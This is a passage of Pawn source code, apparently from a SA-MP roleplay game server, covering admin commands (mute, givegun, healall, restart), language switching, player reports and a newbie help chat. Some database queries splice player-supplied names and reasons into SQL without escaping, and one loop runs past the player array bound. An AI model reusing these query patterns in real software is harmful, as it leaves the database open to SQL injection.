        format(string, sizeof(string), "{FF6347}Offline: [Admin-Warn]: {FFFFFF}%s was muted by %s for %d minutes, reason: %s", id, sendername,time,msg);
		SendClientMessageToAll(COLOR_AdminWarn, string);
		new timem = time*60,
			str1[168];
		mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `Muted`='1',`MuteTime`='%d' WHERE `name`='%s'",timem,id);
		mysql_tquery(SQL,str1,"","");
		format(str1, sizeof(str1), "SELECT `id` FROM users WHERE `name` = '%s'", id);
		mysql_store_result();
		mysql_query(SQL,str1);
		if(mysql_retrieve_row())
		{
			mysql_fetch_field_row(result, "id"); playeridd = strval( result );
		}
		mysql_free_result();
		new var100[256];
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','7','%d','%s','%s','%s')", playeridd,PlayerInfo[playerid][pSQLID],time,msg,id,sendername);
		mysql_tquery(SQL,var100,"","");
		format(string, sizeof(string), "Ai primit mute de la adminul %s pentru %d minute, motiv: %s.", sendername,time,msg);
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','%s')",playeridd,string);
		mysql_tquery(SQL,var100,"","");
	}
	return 1;
}
CMD:savedata(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		foreach(Player, x)
		{
			OnPlayerDateUpdateX2(x);
			Update(x, pPayDayx);
			Update(x, pPayCheckx);
			Update(x, pFpunishx);
			Update(x, pConnectTimex);
			Update(x, pLawyerx);
			Update(x, pBank);
			Update(x, pCashx);
			Update(x, pRP);
			Update(x, pJailTimex);
			Update(x, pGPointsx);
			Update(x, pPremiumPointsx);
			Update(x, pLevelx);
			Update(x, pHTokenx);
		}
		SendClientMessageToAll(COLOR_GREEN,"SavePlayerData: Toate conturile au fost salvate.");
	}
	return 1;
}
CMD:gmx(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    if (PlayerInfo[playerid][pAdmin] >= 6)
		{
		    ShowPlayerDialog(playerid, DIALOG_GMX, DIALOG_STYLE_MSGBOX, "Server Restart", "Please confirm whether you are positive that you wish to initiate a server restart?", "Yes", "No");
		}
		else
		{
		    SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:persian(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    PlayerInfo[playerid][pLanguage] = 2;
    new str[356];
	mysql_format(SQL,str,356,"UPDATE users SET `Language`='2' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
	mysql_tquery(SQL,str,"","");
    SendClientMessage(playerid, COLOR_SERVER, "Zaban Shoma be Persian Tagheer krd.");
    return 1;
}
CMD:english(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    PlayerInfo[playerid][pLanguage] = 1;
    new str[356];
	mysql_format(SQL,str,356,"UPDATE users SET `Language`='1' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
	mysql_tquery(SQL,str,"","");
    SendClientMessage(playerid, COLOR_SERVER, "You have set your language english.");
    return 1;
}
CMD:pr(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_persian(playerid, params);
}
CMD:en(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_english(playerid, params);
}
CMD:giveallgun(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	new weaponid,ammo,string[256],sendername[30];
	if(sscanf(params, "ii", weaponid, ammo)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/giveallgun <Weapon ID> <Ammo>");
	GetPlayerName(playerid, sendername, sizeof(sendername));
	format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has given to all players weapon: %d.",sendername,weaponid);
	ABroadCast(COLOR_AdminWarn,string,1);
  	for(new i = 0; i <= MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			GivePlayerWeaponEx(i, weaponid, ammo);
		}
	}
	return 1;
}
CMD:fuelcars(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 3)
	    {
			new gasvehicle,sendername[30],string[256];
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(sscanf(params, "i", gasvehicle)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/fuelcars <procent>");
		   	for(new c=0;c<CAR_AMOUNT;c++)
			{
				Gas[c] = gasvehicle;
			}
			format(string, sizeof(string), "{C1F589}All cars filled with %d procent fuel.",gasvehicle);
			SendClientMessage(playerid, COLOR_SERVER, string);
			format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has refuelled all vehicles with %d liters.",sendername,gasvehicle);
			ABroadCast(COLOR_AdminWarn,string,1);
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_ERROR, AdminOnly);
	        return 1;
	    }
	}
	return 1;
}
CMD:givegun(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
	   	if (PlayerInfo[playerid][pAdmin] >= 3)
		{
			new id,gun,ammo,string[256],sendername[30],giveplayer[30];
			if(sscanf(params, "uii",id,gun,ammo))
   			{
   				SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/givegun <Name/Playerid> <Weapon ID> <Ammo>");
			    SCM(playerid,COLOR_SERVER,"1-Brass Knuckles; 2-Golf Club; 3-Nightstick; 4-Knife; 5-Baseball Bat; 6-Shovel; 7-Pool Cue; 8-Katana;");
		    	SCM(playerid,COLOR_SERVER,"9-Chainsaw; 10-Double-ended Dildo; 11-Dildo; 12-Vibrator; 13-Silver Vibrator; 14-Flowers; 15-Cane;");
		    	SCM(playerid,COLOR_SERVER,"16-Grenade; 17-Tear Gas; 18-Molotov Cocktail; 22-9mm; 23-Silenced 9mm; 24-Desert Eagle; 25-Shotgun;");
		    	SCM(playerid,COLOR_SERVER,"26-Sawnoff Shotgun; 27-Combat Shotgun; 28-Micro SMG/Uzi; 29-MP5; 30-AK-47; 31-M4; 32-Tec-9; 33-Country Rifle;");
		    	SCM(playerid,COLOR_SERVER,"34-Sniper Rifle; 35-RPG; 36-HS Rocket; 37-Flamethrower; 38-Minigun; 39-Satchel Charge; 40-Detonator;");
		    	SCM(playerid,COLOR_SERVER,"41-Spraycan; 42-Fire Extinguisher; 43-Camera; 44-Night Vis Goggles; 46-Parachute;");
			    return 1;
	    	}
	  	    if(gun < 1||gun > 46||gun==19||gun==20||gun==21||gun==45) return SCM(playerid,COLOR_SERVER,"Invalid weapond ID.");
		    if(ammo <1||ammo > 1000) return SCM(playerid,COLOR_SERVER,"Invalid ammo (1-1000).");
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					GivePlayerWeaponEx(id, gun, ammo);
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has given weapon %d to %s with %d bullets.",sendername,gun,giveplayer,ammo);
            		ABroadCast(COLOR_AdminWarn,string,1);
					if(GetPlayerState(id) == PLAYER_STATE_PASSENGER)
					{
				        new gun2,tmp;
				        GetPlayerWeaponData(id,5,gun2,tmp);
				        #pragma unused tmp
				        if(gun2)SetPlayerArmedWeapon(id,gun2);
				        else SetPlayerArmedWeapon(id,0);
					}
				}
			}
		    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid,COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:healall(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new sendername[25],string[256];
    GetPlayerName(playerid, sendername, sizeof(sendername));
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pAdmin] >= 3)
        {
    		format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has given to all players full hp.",sendername);
            ABroadCast(COLOR_AdminWarn,string,1);
            foreach(Player,i)
			{
				SetPlayerHealthEx(i, 100);
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:serverrestart(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 6)
		{
	  		SCM(playerid, COLOR_SERVER, "You started the countdown for restarting");
			OOCOff(COLOR_GENANNOUNCE,"It was started countdown for restarting");
			serverrestart2 = 30;
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:sethp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id,hp,string[256],giveplayer[30],sendername[30];
			if(sscanf(params, "ui", id, hp)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/sethp <Name/Playerid> <hp>");
	  		if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					SetPlayerHealthEx(id, hp);
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has set %s heal to %d.",sendername,giveplayer,hp);
            		ABroadCast(COLOR_AdminWarn,string,1);
				}
			}
		    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:setarmor(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new id,armor,string[100],giveplayer[30],sendername[30];
			if(sscanf(params, "ui", id, armor)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/setarmor <Name/Playerid> <armor>");
	  		if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					SetPlayerArmourEx(id, armor);
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "{ba9789}Warning: Admin %s has set %s's armor to %d.", sendername,giveplayer,armor);
					ABroadCast(COLOR_SERVER,string,2);
				}
			}
		    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:stats(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pLevel] < 1) return SCM(playerid,COLOR_SERVER,"{FFB870}Command currently inaccessible.");
	if(IsPlayerConnected(playerid))
	{
		ShowStats(playerid,playerid);
	}
	return 1;
}
CMD:colors(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    new string1[1800], string2[1800], string3[1800], string4[1800], string5[1800], string6[1800], string7[1800], string8[1800], string9[1800], string10[1800], string11[1800], string12[1800], string13[1800], string14[1800], string15[1800], string16[1800], string17[3200];
	    format(string1, sizeof(string1), "{FFFFFF}Normal colors:");
 		format(string2, sizeof(string2), "{000000}000 {FFFFFF}001 {33BDCC}002 {FB0404}003 {5C6C62}004 {B07384}005 {E8A33B}006 {6F92A8}007 {C8C2AC}008 {727F6D}009 {707A7B}010 {7A7C71}011 {669999}012 {706E61}013 {D4D0AB}014 {A7A78F}015 {658A5F}016 {9A4042}017 {AA4354}018 {C8C09C}019");
		format(string3, sizeof(string3), "{6B7B8A}020 {995B5E}021 {884C56}022 {B2A88F}023 {66685D}024 {5C5E53}025 {ABAA8E}026 {787065}027 {C7C2A9}028 {9E987E}029 {60453C}030 {704743}031 {C7C2A9}032 {A8A890}033 {94947C}034 {8B856F}035 {595B50}036 {5C6957}037 {ACB28E}038 {959B8F}039");
 		format(string4, sizeof(string4), "{403D34}040 {C7C2A9}041 {924648}042 {6F3039}043 {C7C2A9}044 {6F3E3A}045 {AA9E6E}046 {89815D}047 {C9C097}048 {D5D0B0}049 {A5A58D}050 {5D7962}051 {869284}052 {43505F}053 {535561}054 {988066}055 {A09F8D}056 {A2906C}057 {843C3D}058 {657373}059");
        format(string5, sizeof(string5), "{A6A086}060 {997E53}061 {74393B}062 {9DA188}063 {CEC9A9}064 {B6AF61}065 {69524C}066 {979C96}067 {D4CE9C}068 {C8B191}069 {9E4849}070 {919C94}071 {706F5D}072 {A2A980}073 {6F3C3B}074 {414141}075 {ACA384}076 {AEA07B}077 {8C4541}078 {325068}079");
        format(string6, sizeof(string6), "{935558}080 {AB9E77}081 {974C4C}082 {525F59}083 {735D52}084 {A84F63}085 {577C46}086 {5C7883}087 {804547}088 {AAA27E}089 {B2AC92}090 {565A59}091 {7C7B69}092 {337B7A}093 {3F6167}094 {4D5B5B}095 {BEB999}096 {99A99F}097 {92A298}098 {D6BB8C}099");
        format(string7, sizeof(string7), "{6B9192}100 {525659}101 {C6A67D}102 {3D6473}103 {A38F6C}104 {838673}105 {376879}106 {AEA07B}107 {54697E}108 {686964}109 {8F7B60}110 {989785}111 {879691}112 {7A6957}113 {6E8467}114 {9E424F}115 {9C414E}116 {904446}117 {BEC0B2}118 {88735E}119");
        format(string8, sizeof(string8), "{AB977C}120 {80373E}121 {767966}122 {715C40}123 {8E4244}124 {43586D}125 {E27791}126 {202020}127");
        format(string9, sizeof(string9), "{FFFFFF}Hidden colors:");
        format(string10, sizeof(string10), "{177318}128 {220605}129 {11537A}130 {452A0D}131 {561E1D}132 {020700}133 {252259}134 {2C89AA}135 {894DBE}136 {36973A}137 {B7B7B7}138 {474C8E}139 {84878C}140 {817867}141 {817B27}142 {69506E}143 {593D6F}144 {8DB96E}145 {825076}146 {6B286D}147");
        format(string11, sizeof(string11), "{1D1D14}148 {1F1307}149 {202519}150 {2C4530}151 {1F4C97}152 {2E5F43}153 {1B9A4A}154 {1C9A97}155 {999977}156 {7C8499}157 {992E1E}158 {2E1E08}159 {122507}160 {9A3E4D}161 {1E4C99}162 {198182}163 {1A2A28}164 {156171}165 {1E6582}166 {6C4099}167");
        format(string12, sizeof(string12), "{49190B}168 {79739A}169 {746D99}170 {53397B}171 {21230B}172 {3F190C}173 {46210E}174 {991F1E}175 {8D4C8E}176 {7F5B7F}177 {7B3E81}178 {3C1738}179 {723518}180 {7A1819}181 {833419}182 {8C301B}183 {7F3E54}184 {7B6D7E}185 {020C03}186 {072406}187");
        format(string13, sizeof(string13), "{143112}188 {182F1A}189 {652A4E}190 {348456}191 {999691}192 {808C98}193 {99991D}194 {7E994C}195 {839393}196 {76831E}197 {2C3D99}198 {3B3A0A}199 {8A794E}200 {0E1F4A}201 {16371B}202 {15273B}203 {385774}204 {06081F}205 {071427}206 {203A4B}207");
        format(string14, sizeof(string14), "{2C508A}208 {15426C}209 {0F3252}210 {26175D}211 {692115}212 {8C8C94}213 {526015}214 {090F03}215 {8D573B}216 {53888E}217 {985C52}218 {99581E}219 {993A62}220 {99904F}221 {9A311E}222 {0C1842}223 {521F1E}224 {42420C}225 {4D991D}226 {082A1C}227");
        format(string15, sizeof(string15), "{95821C}228 {197F19}229 {3C141F}230 {745118}231 {893F8E}232 {7D1A6C}233 {0C370A}234 {28450D}235 {071E24}236 {784472}237 {8A6539}238 {732518}239 {319491}240 {57941D}241 {58163C}242 {1B8A2E}243 {38160D}244 {031904}245 {355D8E}246 {2E3F5A}247");
        format(string16, sizeof(string16), "{531C2A}248 {4E0E29}249 {706D67}250 {3C3E43}251 {2E2D33}252 {7B7E7D}253 {4A4542}254 {28334F}255");
		format(string17, sizeof(string17), "%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",string1,string2,string3,string4, string5, string6, string7, string8, string9, string10, string11, string12, string13, string14, string15, string16);
		ShowPlayerDialog(playerid, DIALOG_COLORID, DIALOG_STYLE_MSGBOX, "Vehicle Colors list - /carcolor", string17, "Close","");
	}
	return 1;
}
CMD:report(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
        ShowPlayerDialog(playerid, DIALOG_REPORT_AP1, DIALOG_STYLE_INPUT, "Another problem", "Write down the problem of.\nDo not write 'I need a admin', writes exactly what your problem.", "Send","Close");
	}
	return 1;
}
CMD:reports(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new string[128],cheaters=0,count=0;
		if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		SendClientMessage(playerid, COLOR_SERVER, "______REPORTS______");
		foreach(Player, i)
		{
			if(strcmp(reporttext[i], "NULL", true))
			{
				SendClientMessage(playerid, COLOR_ADMIN, reporttext[i]);
				count++;
			}
			if(reportcheater[i] != -1)
			{
				cheaters++;
			}
		}
		if(cheaters != 0)
		{
			format(string,sizeof(string),"cheaters: %d",cheaters);
			SendClientMessage(playerid, COLOR_ADMIN, string);
		}
		if(count == 0 && cheaters == 0)
		{
			SendClientMessage(playerid, COLOR_SERVER, "No reports available.");
		}
 	}
	return 1;
}
CMD:dr(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new string[128],id,sendername[30];
			if(sscanf(params, "u",id)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/dr <Name/Playerid>");
			if(!strcmp(reporttext[id], "NULL", true)) return SendClientMessage(playerid, COLOR_SERVER, "This player don't have an active report.");
			ReportTime[id] = 0;
			reportcheater[id] = -1;
			reportreason[id] = 0;
			if(playerreported[id] != -1)
			{
				reportreason[playerreported[id]] = 0;
			}
			playerreported[id] = -1;
			timerreport[id] = -1;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string,sizeof(string),"%s deleted %s",sendername,reporttext[id]);
			ABroadCast(COLOR_GREY,string,1);
			format(reporttext[id], 30, "NULL");
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"You are not an admin.");
	}
	return 1;
}
CMD:cr(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new string[128],id,sendername[30],reason[128],giveplayer[30];
			if(sscanf(params, "uS(NULL)[128]",id,reason)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/cr <Name/Playerid> <Text(Optional)>");
			if(!strcmp(reporttext[id], "NULL", true)) return SendClientMessage(playerid, COLOR_SERVER, "This player don't have an active report.");
			ReportTime[id] = 0;
			reportcheater[id] = -1;
			reportreason[id] = 0;
			if(playerreported[id] != -1)
			{
				reportreason[playerreported[id]] = 0;
			}
			playerreported[id] = -1;
			timerreport[id] = -1;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			GetPlayerName(id, giveplayer, sizeof(giveplayer));
			format(string,sizeof(string),"%s closed %s",sendername,reporttext[id]);
			ABroadCast(COLOR_GREY,string,1);
			if(strcmp(reason, "NULL", true))
			{
				format(string,sizeof(string),"(/cr) %s->%s: %s",sendername,giveplayer,reason);
				ABroadCast(COLOR_YELLOW,string,1);
				SendClientMessage(id, COLOR_YELLOW, string);
			}
			format(reporttext[id], 30, "NULL");
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"You are not an admin.");
	}
	return 1;
}
CMD:newbie(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "Please login server!");
    if(IsPlayerConnected(playerid))
	{
	    new message[1000], string[1000],admbotaraspuns = 0;
	    if(sscanf(params, "s[1000]",message))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/newbie <Message>");
			return 1;
		}
		else
		{
			if(FindIP(message)) /// Anti-Reclama
	        {
		        new advertiser[MAX_PLAYER_NAME];
		        GetPlayerName(playerid, advertiser, sizeof(advertiser));
		        format(string, sizeof(string), "{ba9999}(S): %s(%d) typed %s in /n.", advertiser, playerid, message);
				ABroadCast(COLOR_SERVER,string,1);
	        }
	        for(new i; i < sizeof(intrebarejob); i++)
			{
		        if(strfind(message, intrebarejob[i], true) != -1)
		        {
					ShowPlayerDialog(playerid, DIALOG_RASPUNSAUTON, DIALOG_STYLE_MSGBOX, "Help", "I looked at your question and I answered the question that would be addressed helpers\nAnswer: All jobs are profitable, but administrative team recommends job Trucker.","Thank you", "");
                    admbotaraspuns = 1;
				}
			}
			for(new i; i < sizeof(intrebarejob2); i++)
			{
		        if(strfind(message, intrebarejob2[i], true) != -1)
		        {
					ShowPlayerDialog(playerid, DIALOG_RASPUNSAUTON, DIALOG_STYLE_MSGBOX, "Help", "I looked at your question and I answered the question that would be addressed helpers\nAnswer: Type the command / jobs, select the job you want and follow the checkpoints on the map, once there type /getjob.","Thank You", "");
                    admbotaraspuns = 1;
				}
			}
			for(new i; i < sizeof(intrebarestaff); i++)
			{
		        if(strfind(message, intrebarestaff[i], true) != -1)
		        {
					ShowPlayerDialog(playerid, DIALOG_RASPUNSAUTON, DIALOG_STYLE_MSGBOX, "Help", "I looked at your question and I answered the question that would be addressed helpers\nAnswer: \nYou can view the list of leaders in order /leaders.\nPoti view the list of helpers in order /helpers.\nPoti admins can list the command / admins.","Thank You", "");
                    admbotaraspuns = 1;
				}
			}
			for(new i; i < sizeof(intrebarejefuire); i++)
			{
		        if(strfind(message, intrebarejefuire[i], true) != -1)
		        {
					ShowPlayerDialog(playerid, DIALOG_RASPUNSAUTON, DIALOG_STYLE_MSGBOX, "Help", "I looked at your question and I answered the question that would be addressed helpers\nAnswer:\nYou can rob a business control / slave if you're inside it and have 10 points Robbed.","Thank You", "");
                    admbotaraspuns = 1;
				}
			}
	        for(new i; i < sizeof(TLD); i++)
			{
				if(strfind(message, TLD[i], true) != -1)
				{
					if(strfind(message, "wwww.Magic-Gaming.tk", true) != -1 || strfind(message, "www.Magic-Gaming.tk", true) != -1 || strfind(message, "Magic-Gaming.tk", true) != -1) break;
					new advertiser[MAX_PLAYER_NAME];
					GetPlayerName(playerid, advertiser, sizeof(advertiser));
					format(string, sizeof(string), "{ba9999}(S): %s(%d) typed %s in /n.", advertiser, playerid, message);
					ABroadCast(COLOR_SERVER,string,1);
				}
			}
			if(admbotaraspuns == 0)
			{
		    	if(PlayerInfo[playerid][pAdmin] == 0 && PlayerInfo[playerid][pHelper] <= 0)
				{
				    new sendername[30],stringmut[200], qtrimisa = 0;
				    if(PlayerInfo[playerid][pFirstAnswer] == 0)
				    {
				    	if(PlayerInfo[playerid][pNewbieTimeout] == 0)
						{
		      				if(PlayerInfo[playerid][pNMuted] == 0)
							{
							    foreach(Player, i)
							    {
							        if(PlayerInfo[i][pHelper] > 0 && lastquestion[i] == -1 && HelperDuty[i] == 1 && timefornextquestion[i] == -1)
							        {
							            if(qtrimisa == 0)
							            {
					   	 					GetPlayerName(playerid, sendername, sizeof(sendername));
									    	format(string, sizeof(string), "{A9C4E4}** {FFFB21}Question from %s (ID: %d, LEVEL: %d) {A9C4E4}**", sendername, playerid, PlayerInfo[playerid][pLevel]);
									    	SCM(i, COLOR_SERVER,string);
									    	format(string, sizeof(string), "Question: %s",message);
									    	SCM(i, COLOR_YELLOW, string);
									    	SCM(i, -1, "{A9C4E4}** {FFFB21}Use /nre [the answer to the question above] {A9C4E4}**");
	                                        aprimitintrebarea[playerid] = i;
									    	format(string, sizeof(string), "* Newbie %s: %s", sendername, message);
		         							qtrimisa = 1;
									    	format(PlayerInfo[playerid][pNMessage],256,string);
									    	lastquestion[i] = playerid;
											format(PlayerInfo[playerid][pNMessage2],256,message);
											SendClientMessage(playerid,COLOR_NEWBIE,PlayerInfo[playerid][pNMessage]);
											PlayerInfo[playerid][pNewbieTimeout] = 120;
											PlayerInfo[playerid][pFirstAnswer] = 1;
											SCM(playerid, COLOR_ERROR, "The question has been sent you expect to be answered");
										}
									}
								}
							}
							else return SendClientMessage(playerid, COLOR_ERROR, "Were you on chat question mutit!");
							if(qtrimisa == 0)
							{
							    SCM(playerid, COLOR_ERROR, "Unfortunately all helperii is busy at the moment, please try again later ...");
							}
						}
						else
						{
					    	format(stringmut, sizeof(stringmut), "Can be used for /n more than %d seconds.", PlayerInfo[playerid][pNewbieTimeout]);
		                	SendClientMessage(playerid,COLOR_ERROR,stringmut);
						}
					}
					else
					{
   	 					SCM(playerid, COLOR_ERROR, "You already put a question, wait until you will answer.");
					}
				}
				else return SendClientMessage(playerid, COLOR_ERROR, "You are an admin/helper.");
			}
		}
	}
	return 1;
}
CMD:n(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_newbie(playerid, params);
}
CMD:togn(playerid, params[])
{
	if(PlayerInfo[playerid][pNewbieEnabled] == 1)
	{
	    PlayerInfo[playerid][pNewbieEnabled] = 0;
	    SendClientMessage(playerid, COLOR_SERVER, "You will no longer see newbie chat.");
	}
	else
	{
	    PlayerInfo[playerid][pNewbieEnabled] = 1;
	    SendClientMessage(playerid, COLOR_SERVER, "You will now see newbie chat.");
	}
	return 1;
}
CMD:viewnewbie(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
	{
        SendClientMessage(playerid, COLOR_TEAL, "---------------------------------------------------------------------------------------------------------------------------------");
        foreach(Player, x)
		{
			if(PlayerInfo[x][pNMessage2] != 0)
			{
			    new string[256];
				format(string, sizeof(string), "Requested by: %s | Problem: %s", PlayerInfo[x][pNormalName], PlayerInfo[x][pNMessage2]);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
		}
        SendClientMessage(playerid, COLOR_TEAL, "---------------------------------------------------------------------------------------------------------------------------------");
	}
	return 1;
}
CMD:nre(playerid, params[])
{
    if(PlayerInfo[playerid][pHelper] >= 1)
	{
	    new sendername[30],giveplayer[30],message[1000],string[1000];
	    if(sscanf(params, "s[1000]",message))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/nre <Message>");
			return 1;
		}
		else
		{
		    GetPlayerName(playerid, sendername, sizeof(sendername));
		    if(lastquestion[playerid] != -1)
		    {
		        if(IsPlayerConnected(lastquestion[playerid]))
		        {
			        GetPlayerName(lastquestion[playerid], giveplayer, sizeof(giveplayer));
	    			if(PlayerInfo[playerid][pAdmin] >= 1)
					{
	       				format(string, sizeof(string), "* Admin %s: @%s, %s", sendername, giveplayer, message);
					}
					else if(PlayerInfo[playerid][pHelper] >= 1)
					{
						format(string, sizeof(string), "* Helper %s: @%s, %s", sendername, giveplayer, message);
					}
					foreach(Player,x)
					{
	    				if(PlayerInfo[x][pNewbieEnabled] == 1)
						{
	        				if(PlayerInfo[x][pAdmin] >= 1 || PlayerInfo[x][pHelper] >= 1 || x == lastquestion[playerid])
							{
								SendClientMessage(x,COLOR_YELLOW,string);
							}
							else
							{
	  							if(PlayerInfo[lastquestion[playerid]][pFirstAnswer] != 0)
					  			{
									SendClientMessage(x,COLOR_NEWBIE,PlayerInfo[lastquestion[playerid]][pNMessage]);
									SendClientMessage(x,COLOR_NEWBIE,string);
								}
								else
								{
								    SendClientMessage(x,COLOR_NEWBIE,string);
								}
							}
						}
					}
					PlayerInfo[lastquestion[playerid]][pNMessage] = 0;
					PlayerInfo[lastquestion[playerid]][pNMessage2] = 0;
					PlayerInfo[lastquestion[playerid]][pFirstAnswer] = 0;
					aprimitintrebarea[lastquestion[playerid]] = -1;
					lastquestion[playerid] = -1;
					timefornextquestion[playerid] = 20;
					PlayerInfo[playerid][pHelpedPlayers]++;
					Update(playerid, pHelpedPlayersx);
				}
				else
				{
				    SCM(playerid, COLOR_ERROR, "Jucatorulnu is offline, the question has been deleted.");
				    lastquestion[playerid] = -1;
					timefornextquestion[playerid] = 20;
				}
			}
		}
	}
	return 1;
}
CMD:ndelete(playerid, params[])
{
	if(PlayerInfo[playerid][pHelper] >= 1 || PlayerInfo[playerid][pAdmin] >= 1)
	{
			new sendername[30],giveplayer[30],message[1000],string[1000],string2[1000];
		    GetPlayerName(playerid, sendername, sizeof(sendername));
